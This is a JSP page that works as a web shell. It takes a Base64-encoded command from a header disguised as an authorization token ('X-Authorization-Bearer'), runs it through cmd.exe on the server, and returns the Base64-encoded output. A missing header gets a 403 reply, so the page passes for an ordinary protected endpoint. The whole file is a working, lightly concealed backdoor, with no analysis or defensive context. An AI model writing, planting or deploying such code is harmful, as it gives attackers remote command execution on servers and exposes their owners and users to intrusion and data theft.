<%@ page import="java.io.*, java.util.Base64" %>
<%
    String authHeader = request.getHeader("X-Authorization-Bearer");
    if (authHeader == null) {
        response.sendError(403, "Forbidden");
        return;
    }
    
    String cmd = new String(Base64.getDecoder().decode(authHeader), "UTF-8");
    
    String output = "";
    try {
        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", cmd);
        Process process = pb.start();
        InputStream inputStream = process.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        StringBuilder result = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            result.append(line).append("\n");
        }
        output = Base64.getEncoder().encodeToString(result.toString().getBytes("UTF-8"));
    } catch (Exception e) {
        output = Base64.getEncoder().encodeToString("Execution failed".getBytes("UTF-8"));
    }
    
    response.setContentType("text/plain");
    response.getWriter().write(output);
%>